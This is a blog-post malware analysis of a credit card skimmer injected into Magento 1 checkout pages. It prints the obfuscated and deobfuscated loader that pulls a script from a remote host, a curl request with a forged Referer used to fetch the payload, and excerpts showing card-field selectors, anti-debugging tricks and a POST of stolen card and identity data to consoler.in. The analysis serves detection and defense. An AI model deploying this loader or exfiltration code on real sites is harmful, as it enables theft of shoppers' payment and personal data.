---
layout: post
title: "Analyzing Recent's Magento 1 Credit Card Skimmer"
categories: [Fraud]
tags: [Javascript, Skimmer]
description: In this blog post, we analyze a credit card skimmer injected on Magento 1 websites to steal credit card information.
---

This week, <a href="https://sansec.io/news/magento-1-beyond-june">Sansec</a> revealed that several Magento 1 websites had been compromised by hackers that had been able to inject credit card skimmers on pages of the checkout process.
Since I wanted to better understand how these credit skimmers were working, I decided to conduct a quick analysis.

I started from Sansec's tweet that seemed to indicate that the skimmer loader was available on ```facelook.no/en_US/pixel.js```.

<img src="/assets/media/tweet_skimmer.png"> 

## Analyzing the skimmer loader

If we visit the URL above, we obtain a (slightly) obfuscated file with the following content (I don't link to this URL with a proper link to avoid being flagged as a malicious website by search engines):
```javascript
var a0a=['loud','lize','oudf','/wid','item','e-st','//aj','.com','lare','ckou','scri','ntBy','bute','/cdn','atic','|one','chec','appe','este','rHei','ndCh','setA','ntsB','head','clou','eche','emen','kout','/scr','leme','rWid','bug','Fire','flar','5d/c','-cgi','chro','loca','/103','epag','cart','onep','src','step','getE','isIn','itia','teEl','crea','test','ttri','yTag','rHTM','|fir','age|','ght','49f5','ipts','t|on','get.','pche','ild','oute','Name','inne','axcl','tion'];(function(a,b){var c=function(d){while(--d){a['push'](a['shift']());}};c(++b);}(a0a,0x1e0));var a0b=function(a,b){a=a-0x0;var c=a0a[a];return c;};function a0c(){var a=window[a0b('0x33')+a0b('0x13')+'th']-window[a0b('0x35')+a0b('0x13')+'th']>0xa0;var b=window[a0b('0x33')+a0b('0x8')+a0b('0x2c')]-window[a0b('0x35')+a0b('0x8')+a0b('0x2c')]>0xa0;return!(b&&a||!(window[a0b('0x15')+a0b('0x14')]&&window[a0b('0x15')+a0b('0x14')][a0b('0x19')+'me']&&window[a0b('0x15')+a0b('0x14')][a0b('0x19')+'me'][a0b('0x22')+a0b('0x23')+a0b('0x39')+'d']||a||b));}if(new RegExp(a0b('0x1e')+a0b('0x2b')+a0b('0x5')+a0b('0x10')+a0b('0x4')+a0b('0x20')+a0b('0x2a')+a0b('0xe')+a0b('0x41')+a0b('0x2f')+a0b('0x7')+a0b('0x31')+a0b('0x41')+a0b('0x2f')+a0b('0x1c')+a0b('0xe')+a0b('0x41')+'t')[a0b('0x26')](window[a0b('0x1a')+a0b('0x37')])&&!new RegExp(a0b('0x1d'))[a0b('0x26')](window[a0b('0x1a')+a0b('0x37')])){var a0d=document[a0b('0x25')+a0b('0x24')+a0b('0xf')+'t'](a0b('0x42')+'pt');var a0e=a0b('0x3e')+a0b('0x36')+a0b('0x3a')+a0b('0x40')+a0b('0x3f')+a0b('0x2')+a0b('0x18')+a0b('0x11')+a0b('0x2e')+a0b('0x1b')+a0b('0x2d')+a0b('0x17')+a0b('0x38')+a0b('0x16')+a0b('0x3d')+a0b('0x3')+a0b('0x3b')+a0b('0x30')+'js';a0d[a0b('0xa')+a0b('0x27')+a0b('0x1')](a0b('0x1f'),a0e);a0d[a0b('0xa')+a0b('0x27')+a0b('0x1')]('id',a0b('0xd')+'d');document[a0b('0x21')+a0b('0x12')+a0b('0xb')+a0b('0x28')+a0b('0x34')](a0b('0xc'))[a0b('0x3c')](0x0)[a0b('0x6')+a0b('0x9')+a0b('0x32')](a0d);numInterval=setInterval(function(){if(a0c()){if(document[a0b('0x21')+a0b('0x12')+a0b('0x0')+'Id'](a0b('0xd')+'d')){document[a0b('0x21')+a0b('0x12')+a0b('0x0')+'Id'](a0b('0xd')+'d')[a0b('0x33')+a0b('0x29')+'L']='';}}},0x12c);}
```

Since the obfuscation is quite basic, we use online tools like <a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a>
to deobfuscate this first program.

Once deobfuscated, you obtain the following JS file:
```javascript
function a0c() {
    var a = window.outerWidth - window.innerWidth > 160;
    var b = window.outerHeight - window.innerHeight > 160;
    return !(b && a || !(window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized || a || b));
}
if (new RegExp('onepage|checkout|onestep|firecheckout|onestepcheckout|onepagecheckout').test(window.location) && !new RegExp('cart').test(window.location)) {
    var a0d = document.createElement('script');
    var a0e = '//ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js';
    a0d.setAttribute('src', a0e);
    a0d.setAttribute('id', 'cloud');
    document.getElementsByTagName('head').item 0. appendChild(a0d);
    numInterval = setInterval(function () {
        if (a0c()) {
            if (document.getElementById('cloud')) {
                document.getElementById('cloud').outerHTML = '';
            }
        }
    }, 300);
}
```

This short code snippet is not doing a lot of things besides loading the actual skimmer and verifying that the browser dev tools are not opened.
We can go through the code to analyze what it's doing more in details:
```javascript
// This function verifies if the dev tools are opened
function a0c() {
    // Simple check to verify if the devtools are opened on the left/right
    var a = window.outerWidth - window.innerWidth > 160;
    
    // Detect if devtools are opened on the top/bottom
    var b = window.outerHeight - window.innerHeight > 160;

    // These 2 conditions won't help to detect if devtools are opened in another window     
    // That's why they also use other heuristics like testing the presence of window.Firebug
    return !(b && a || !(window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized || a || b));
}
```

The remainder of the code calls the function that verifies if dev tools are opened or not. 
If the dev tools are not opened and if the code is executed on a page where credit card information is available, then it loads the actual skimmers:
```javascript
// window.location contains information about the current location of the document: https://developer.mozilla.org/en-US/docs/Web/API/Window/location 
// Test if the user is on a whose url included one of the strings included in the regexp but not on the cart page
if (new RegExp('onepage|checkout|onestep|firecheckout|onestepcheckout|onepagecheckout').test(window.location) && !new RegExp('cart').test(window.location)) {
    // If it's the case, the script create a script element that'll load another script (the actual skimmer)
    var a0d = document.createElement('script');
    // URL of the skimmer
    var a0e = '//ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js';
    a0d.setAttribute('src', a0e);
    a0d.setAttribute('id', 'cloud');
    document.getElementsByTagName('head').item 0. appendChild(a0d);
    // Append the script to the page to load the actual skimmer
    numInterval = setInterval(function () {
        // constantly checks if devtools are opened every 300 ms
        // if it's the case, it deletes the code of the skimmer
        // This it helps to remain undetected if someone is trying to do some analysis
        if (a0c()) {
            if (document.getElementById('cloud')) {
                document.getElementById('cloud').outerHTML = '';
            }
        }
    }, 300);
}
```

## Obtaining and analyzing the code of the skimmer
We want to load the code of the skimmer to analyze it and execute it.
However, if we visit the URL contained in the skimmer loader, the page doesn't return anything.

<img src="/assets/media/empty_file_skimmer.png"> 

My intuition was that they were verifying if the request was coming from a page where it makes sense to include the skimmer, e.g. a checkout page.
Thus, I forged a request with curl to pretend the request was coming from a checkout page:
```
curl 'http://ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js' \
  -H 'Connection: keep-alive' \
  -H 'Referer: https://randomwebsite.com/xxx/checkout/yyy' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' \
  --compressed \
  --insecure
```

When we lie about the referer, the page now returns an obfuscated script.
This time it's bigger than the simple skimmer loader, ~ 1.7K lines of codes.
We deobfuscate it using <a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a>.
Although the deobfuscation is not complete at all, it still helps to decode obfuscated strings.

Before we analyze more in details the content of the skimmer, it can be split into three main parts that intertwined because of obfuscation:
1. Anti debugging techniques (same as in the skimmer loader + other techniques to detect if the code has been unminified)
2. Listening to user events (mouse click) and reading values submitted by the user (credit card, name, address, etc)
3. Obfuscating/encoding the value of the payload to remain undetected.

In the remainder of this blog post, I explain how I was able to analyze the skimmer, in particular how I deactivate the anti-debugging protection, and I also present the main information collected by the skimmer.

At first sight, we quickly notice several arrays of strings related to CSS selectors related HTML elements where users submit information for their credit card. 
```javascript
window.RXExxwZOCk = ["*[name*='n" + 'umero_cart' + "ao']", 'input[id*=' + "'cc_number" + '\']', "*[name*='cc_num']", '#pagarme_cc_cc_number', '#omise_gateway_cc_number', '#stripeCardNumber', '#card-number', '#field--card-number'];
window.ntRYdQZqASm = ["*[name*='e" + 'xpiracao_m' + "es']", "*[name*='cc_exp_m']", "*[name*='e" + 'xpirationM' + "onth']", '#pagarme_cc_expiration', '#omise_gateway_expiration', '#stripeCardExpiryMonth', '#field--month'];
window.adVWkXfNfcv = ["*[name*='c" + 'c_exp_date\']', '#card-date'];
window.NnNndlyI = ["*[name*='e" + 'xpiracao_a' + "no']", "*[name*='cc_exp_y']", "*[name*='e" + 'xpirationY' + "ear']", '#pagarme_cc_expiration_yr', '#omise_gateway_expiration_yr', '#stripeCardExpiryYear', '#field--year'];
window.VkJhhFNh = ["*[name*='c" + 'odigo_segu' + "ranca']", 'input[id*=' + "'cc_cid']", "*[name*='cc_cid']", "*[name*='cc_cvv']", '#pagarme_cc_cc_cid', '#omise_gateway_cc_cid', '#stripeCardCVC', '#card-code', '#field--cvv'];
```

For example, for the window.RXExxwZOCk variable:
```javascript
// Once concatenated we obtain the following array of strings:
["*[name*='numero_cartao']", "input[id*='cc_number']", "*[name*='cc_num']", "#pagarme_cc_cc_number", "#omise_gateway_cc_number", "#stripeCardNumber", "#card-number", "#field--card-number"]
```

I created a simple HTML page that includes one HTML element that matches a CSS selector present in the array above.
However, if you try to execute the skimmer in the HTML page and open the dev tools to analyze the execution flow, the dev tools get completely stuck.
This is likely caused by anti-debugging techniques meant to make it more difficult to analyze.

### Locating and disabling anti-debugging code


Similarly to the skimmer loader, we notice that the skimmer continuously verifies if the dev tools are opened. 
Although the code is different from the first snippet of this blog post, it's basically testing the same properties:
```javascript
function a0k() {
    var b = {};
    b.kfeqZ = function (g, h) {
        return g > h;
    };
    b.KvpBK = function (g, h) {
        return g - h;
    };
    b.gAXhe = function (g, h) {
        return g > h;
    };
    b.DwLye = function (g, h) {
        return g - h;
    };
    b.zcLEE = function (g, h) {
        return g && h;
    };
    var c = b;
    var d = c.kfeqZ(c.KvpBK(window.outerWidth, window.innerWidth), 160);
    var f = c.gAXhe(c.DwLye(window.outerHeight, window.innerHeight), 160);
    return !(c.zcLEE(f, d) || !(window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized || d || f));
}
```

To avoid being stuck because of the code that verifies if the dev tools are opened, I modify it so that the function always returns true.

However, doing it was not enough since my dev tools continued to be completely stuck in a loop while trying to execute the code.
It appears the code of the skimmer is also checking if functions have been unminified by checking if the toString of some functions match (or not) a given regular expression.
Thus, I've replaced the return statement of this function by ``` return true``` so that the code believes it's still obfuscated.

To make the debugging process more difficult, the skimmer also overrides all console.* functions.
Instead of printing the information, as usual, these functions don't do anything.
Note that this information can be used as a simple signature to detect the presence of this skimmer at execution time.
If you want to decrease the risk of false positives, you can also check if the script tries to access properties related to ```window.Firebug```.
```javascript
// snippet of code responsible for overriding all functions related to console
// With d = a function that returns nothing
// Note that this code pattern: while(true) ... with a lot of case
// is called control flow flattening and is available in the main obfuscator
while (true) {
    switch (h[i++]) {
    case '0':
        f.console.table = d;
        continue;
    case '1':
        f.console.log = d;
        continue;
    case '2':
        f.console.exception = d;
        continue;
    case '3':
        f.console.warn = d;
        continue;
    case '4':
        f.console.trace = d;
        continue;
    case '5':
        f.console.error = d;
        continue;
    case '6':
        f.console.debug = d;
        continue;
    case '7':
        f.console.info = d;
        continue;
    }
    break;
}
```

At runtime, you can easily detect that these functions have been overridden, e.g. for console.log:
```javascript
console.log.toString()
// "function log() { [native code] }" in case it's not overridden on Chrome
// "function () {}" once it's been overriden
```

### Collecting user personal information

The skimmer tests the presence of several HTML elements related to forms containing information about the credit card or the user like the address, name, etc:
```javascript
// *[name*='numero_cartao'],input[id*='cc_number'],*[name*='cc_num'],#pagarme_cc_cc_number,#omise_gateway_cc_number,#stripeCardNumber,#card-number,#field--card-number
```

If these elements are available, it sets ```click``` and ```mousedown``` event listeners on elements (buttons, inputs) that enables to validate the information from your checkout form.
```javascript
"button[onclick*='.save'],button[class*='checkout'],input[class*='checkout'],button[class*='place-order']
```

When the ```mousedown``` or the ```click``` events are triggered on an element for which a listener was set, the skimmer collects all the information about the user and the credit card using ```querySelector``` and ```querySelectorAll`, encode the information so that the information exfiltrated are is too obvious when looking at the network traffic, and does a POST request to https://consoler.in/502.jsp?e=1'.


Obviously, the skimmer collects information about the credit card.
It also collects information related to the user's identity, such as its name and last name, as well as its address.
```javascript
["host", "number", "exp1", "exp2", "cvv", "firstname", "lastname", "address", "city", "state", "zip", "country", "phone", "email", "uagent"]
```

It also collects information about the user-agent, maybe to use it later to forge it when conducting credit card fraud. 
Thus, fraudsters can make as if the request was originating from the same kind of computer as the victim he stole the credit card from.
```javascript
w.push(navigator.userAgent);
```

The information collected is first stored in 2 separate arrays and then encoded into a string:
```javascript
// function to encode the information
// b contains the keys of the information, ["host", "number", "exp1", "exp2", "cvv", "firstname", "lastname", "address", "city", "state", "zip", "country", "phone", "email", "uagent"]
// c contains the associated values
function a0m(b, c) {
        var d = {};
        d.qpMbP = function (k, l) {
            return k < l;
        };
        d.MTmcp = function (k, l) {
            return k !== l;
        };
        d.IjIbk = 'YWIja';
        d.BQefK = function (k, l) {
            return k % l;
        };
        d.vmvOY = function (k, l) {
            return k + l;
        };
        d.dDFhM = function (k, l) {
            return k + l;
        };
        d.NVtDj = function (k, l) {
            return k(l);
        };
        var e = d;
        var f = 113;
        var g = [];
        for (var h = 0; e.qpMbP(h, b.length); h++) {
            if (e.MTmcp(e.IjIbk, e.IjIbk)) {
                // they never go into this part while encoding, this is used earlier
                var l = selectors[h];
                var m = document.querySelector(l);
                if (m) return m;
            } else {
                var j = e.BQefK(e.vmvOY(f, h), b.length);
                g.push(e.dDFhM(e.dDFhM(e.NVtDj(encodeURIComponent, b[j]), '='), e.NVtDj(encodeURIComponent, c[j])));
            }
        }
        return g.join('&');
    }
```
This returns a string with the following format:
```javascript
"city=&state=&zip=&country=&phone=&email=&uagent=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_14_6)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F85.0.4183.102%20Safari%2F537.36&host=&number=&exp1=02&exp2=11&cvv=&firstname=&lastname=&address="
```

In my case it's mostly empty since I've not specified the majority of the information.

Then, the string that contains both keys and values is encoded several times using different functions. 
In the end, we obtain a string that has the following format:
```javascript
"_p2=FvidCc%20DOif%5B%20NIN%20%5Dt%20viN%20iEGcO%20eTCt&_m=ae%20O%7DIC(aNT(%20E%20OTO%7Da%20RI%7B%7DIteNAI%7DoOG&_u3=oNoFNiNieEIt%20%20Cteett%7BCfuI%5D%20IattS%20%20v%20CcNau%7BoO&_s3=SGvR%20tCEvfE%5B%20OEu%20%20CEIo((gR%5BDETrt&_g3=ecCRGo%7BaNOTTIcoA%5D%5Di%5DRnd%20oEOTiIutIct%7B%20in&_b2=G%20no%7DuriN%5B%5B%7DO%20NiInn%7DendS%7B%20%5BNDnntNAN%5Bt&_m1=N%5DS%20ueg%7DnnNNTUeetiocGGnTaO%20%20ONOST&_p3=)%20ND%20ea%5BCGr%20oOt%20efI))iTES%20S%5BO%20%20Et%7BIE%20TtS%20It&_x3=A%20O(%20c(dcr%20N%5B%20t%20rTEcrN)%5D%5Bc%20tiCGucfnI%7BnT)&_g1=toEt%5Dc%7Dn(%20G%20%7DtnT%5B(%20cn(%7DtU%20%5Bn%20eViAaIS&_i1=EN%20EigIN%20%20feaRCgofnN%20nN%20ntncGiTuoeO&_j=%5BOofoCT%20Trd%20Ucii%7B%20nRFGNtnDnOTn%7BTEgtt%7DTTc(%20n&_d2=AUo%7Bf%5BA%20oAnnDtOOF%7B(S%20iecIOtUt%20%7BI%20it&_z3=%20INT))anng%7BaD%20)gOcoO%20%7DdGfAOtSSCEOno%20%20%20&_h2=NRo%20(g%5BTT%20(O%5B%20Nev%7DOE%5Bn%20%7D%20%7DSoongO%7B%20%7DoI&_o1=TnoodgOn%20Nt%5DNnCo)NeTtnVEOnOUu%20))%5BNTaiOTIC%20A%20&_x=%20%7B%20ivONN%7BnNNORt%20T%7DCSOeFS)Gr%20C%7BT(i%20uEne&_d1=%20nIE%20e%7Be%5D%20Tt%20Ran%20%7D%5DOOOI%7Bv%5BgoS%20(%20uISDocn%7DEStnT&_z=n)neAG%7DCta%20%20N%5Do%20Nc%20eVTINiTtNfr)&_s2=O%20%7B%5BvO%20v%20nNoDnSeRnoeTiOSVuO%20i(INe%20%20&_v3=TN%20()%20O%5D%5DDIC%20aR%20CgTgcc%20%20eO(ov%20OcSNdnnoTvo(Si)&_y=TT%5D%5B%5D%5DIccNcot%7D(VRS(TOEAfTE%20tooCtSI&_v1=GOoncIEDnO%20SCN)%5B%7DTIoNrTv%20RCrFTfTetvN%20tO&_r1=dcI%7BT%20O%20%20T%5Ddc)ttTT%7DI%20)cD%5Dot%5DA)t&_q1=%7D(%20%5D%7DR%5B%20Tn%20oT%5BVdGnN%20%20%20U%5BTO%5DnvS&_l=URO%20SOvGCN%7B%5BCtGoin%7DooE%5B%20SI%5Dd%20SCc%7Btegv%7BtSN&_z2=dcC%20)%7Do%5BEeD%5BFgI%5Bf%20ATIt%5DitOIncn%5DcgC%7BtenNNTf&_a3=NnidD%5DtFRtTCtN%20%20(N)FID%7DT%7DO%5D%7Dit%20tVt%5B%20o)%20&_s=t(CSeotFeTovUaveOnSTTNnaTtNn%7BI(reS%20I&_f1=T%5DR%5DI%7Dn%5BNonnt%5BTtEN%20%20%5B%5DFDnI%20%20toiioTtN%20Sd%20%7B%5BOtt&_g=SNC%20ti%20eV%20T%7BEDTNcN%20R%20NvnCvi%20RUie%20O&_y3=%20%7B%7D(CNN%7DU%7B%20%20iod%20g%20oa(dtI%20%20Sn%20NIv%20%20eE(RNc&_q2=N%7DSNgAT)%20dTITT%5D%5DT%20D%5BeEtGt%7BOSdr)NtcfiOTC%20tTg&_u=nT%5BRg%20UcoEo%7BONeTOnAn%20nT%20iO%7BO%20n%20%5B%20oaU%5D%20&_s1=%7DCoTnrI(%7BtE%20%20vIFedFVoIC(S%7D%7D%5DCNtt%20%5D(DnIIAO(%20o&_h=tVto%20eTS%7D%20NIO%20E%20%7B%7BGSigtTSrA%20tC(%20vne&_u2=o%20N)DT)t%20E)E%5DA%5DiNno%7BenU%7DdOofvidTTE&_l2=oNatt((NOn%20)tO%20OdnC%20%7DSNDnOnOO%5B%5Bo%7B%20%20%20N(o%20FAST&_a2=%5DoSoO%5B%7DT%7BSAcNASSftt(UET%7DIInETeR%7BC%7DS%20IEt&_k=%7D%7D%5BdNtvR%5Dotac%20otO)E%20EcOIto%20)UG%20iDTnNTA&_x2=EIR%5DAIUNFNu)TO%7B)%20nf(%20%7De%7B%7B)%20io%20aOATAoN%20aEi(TeS&_i3=neodi(f%20(%20Ean%20oO%20eUiNG(Er%20c%7D%20u%7DS%7Dun&_g2=%5DSS(OiiOV%5DGT)gcotvTECT%20nT%7D%20D%20SIO&_o=aio%20T(G)UTo%7DI%20D%20%5D%20%20%5D%20aO%20%7D%20%7DfIA)%7B%20(tNS&_l3=Si%5BoIn%5DTn%7DNcFev%20%7Bi%5D%5Dgft%20tTGOe%20%7Bo%20NEVi%20OC%7BVt&_c=%20%5DNIVSii(N(TI%7B%20UONoniEIudT%7BIiTvS(%5DGi()cF)N(&_t3=i)%20%7D%20%20e%20%20%20nn%20%7BncN%20S%20%20rt(oeOc%20a%20o%20%20NT)n%5B(%20%20a&_a1=ffnTiNAS(VI%20%7DCn(AOD%5BSItcrnTE%20e)NEodN"
```

Finally, the encoded/obfuscated payload is sent to ```https://consoler.in/502.jsp?e=1``` as a POST request using ```XMLHttpRequest```.

```javascript
d.fzgQw = 'https://consoler.in/502.jsp?e=1';
d.GeFID = 'POST';
var e = d;
if (e.HGrdF(a0k)) return;
var f = new XMLHttpRequest();
var g = e.fzgQw;
f.onreadystatechange = function () {
    // ...
};
f.open(e.GeFID, g, true);
f.send(b);
```

In the next blog post, I will show how you can create a simple crawler with Puppeteer and Headless Chrome to detect if a skimmer like the one we analyzed in this article, has been injected on a website.